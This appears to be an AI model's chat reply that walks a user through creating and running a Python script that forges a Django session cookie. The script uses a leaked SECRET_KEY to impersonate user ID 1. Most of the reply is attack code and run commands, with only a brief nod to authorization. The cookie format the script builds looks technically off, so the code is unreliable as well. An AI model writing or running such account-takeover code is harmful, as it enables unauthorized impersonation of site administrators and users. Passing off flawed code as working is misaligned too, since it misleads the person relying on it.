To run the script that signs session data, you can place it in any folder that has access to your Django environment and dependencies. Here are the steps to properly run the script:

### Steps to Run the Script

1. **Ensure Django Environment**:
   - Make sure you have a working Django environment with all dependencies installed. This includes Django and any other required packages.

2. **Place the Script**:
   - You can place the script in any directory, but for convenience and to keep things organized, it’s a good idea to place it within your Django project directory.

3. **Create the Script File**:
   - Create a new Python file in your Django project directory. For example, you can name it `forge_session.py`.

4. **Activate Virtual Environment**:
   - If you are using a virtual environment, activate it. This ensures that the script runs with the correct dependencies.

   ```bash
   source path/to/your/virtualenv/bin/activate
   ```

5. **Run the Script**:
   - Navigate to the directory where the script is located and run it using Python.

   ```bash
   cd path/to/your/django/project
   python forge_session.py
   ```

### Example Directory Structure

Here’s an example of how your project directory might look:

```
my_django_project/
├── manage.py
├── my_django_project/
│   ├── __init__.py
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
├── app_name/
│   ├── __init__.py
│   ├── admin.py
│   ├── apps.py
│   ├── models.py
│   ├── views.py
│   └── ...
├── forge_session.py  # <- Place your script here
└── ...
```

### Content of `forge_session.py`

Here’s the full content of the `forge_session.py` script:

```python
import json
import base64
from django.core.signing import Signer

# The SECRET_KEY from the leaked settings
SECRET_KEY = 'your-leaked-secret-key'

# Sample session data
session_data = {
    '_auth_user_id': '1',  # ID of the user to impersonate
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
}

# Serialize and sign the session data
session_data_json = json.dumps(session_data)
session_data_encoded = base64.b64encode(session_data_json.encode()).decode()
signer = Signer(key=SECRET_KEY)
signed_session_data = signer.sign(session_data_encoded)

print(f'Session Cookie: {signed_session_data}')
```

### Running the Script

1. **Navigate to the Project Directory**:
   ```bash
   cd path/to/your/django/project
   ```

2. **Run the Script**:
   ```bash
   python forge_session.py
   ```

### Important Notes

- **Security**: Running this script poses a significant security risk. Ensure that you understand the implications and that you have authorization to perform such actions.
- **Environment**: Make sure your environment variables and settings are correctly configured to avoid any unintended consequences.
- **Dependencies**: Ensure that all necessary dependencies, especially Django, are installed in your environment.

By following these steps, you can run the script to forge a session cookie using the leaked `SECRET_KEY`.
